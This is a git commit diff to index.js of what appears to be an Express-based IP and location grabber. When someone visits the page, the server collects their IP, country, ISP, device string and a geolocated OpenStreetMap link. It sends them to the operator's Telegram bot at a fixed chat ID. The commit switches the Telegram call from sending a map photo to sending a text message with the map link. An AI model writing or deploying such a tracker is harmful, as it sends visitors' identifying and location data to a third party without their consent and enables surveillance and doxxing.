cc3a59a274f5b00aaba2aa5988e4069ba7de1393
Ehsan <144959137+TssHack@users.noreply.github.com>
2025-05-17 01:10:55 +0330

    Update index.js

--- index.js
+++ index.js
@@ -20,7 +20,7 @@ app.get('/', async (req, res) => {
     const mapImage = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x400&markers=${lat},${lon},red-pushpin`;
     const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;
 
-    const caption = `
+    const message = `
 آیدی: ${uniqueId}
 IP: ${ip}
 کشور: ${country}
@@ -28,16 +28,16 @@ IP: ${ip}
 ISP: ${isp}
 دستگاه: ${userAgent.toString()}
 نقشه: ${mapLink}
+تصویر نقشه: ${mapImage}
     `;
 
-    // ارسال تصویر نقشه به تلگرام
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+    // ارسال پیام متنی به تلگرام به همراه لینک تصویر
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
-      photo: mapImage,
-      caption
+      text: message
     });
 
-    res.send('<h2>نقشه دقیق شما ارسال شد (بدون کلید API)</h2>');
+    res.send('<h2>اطلاعات و لینک نقشه به تلگرام ارسال شد</h2>');
   } catch (error) {
     console.error(error);
     res.status(500).send('خطا در دریافت موقعیت یا ارسال به تلگرام');
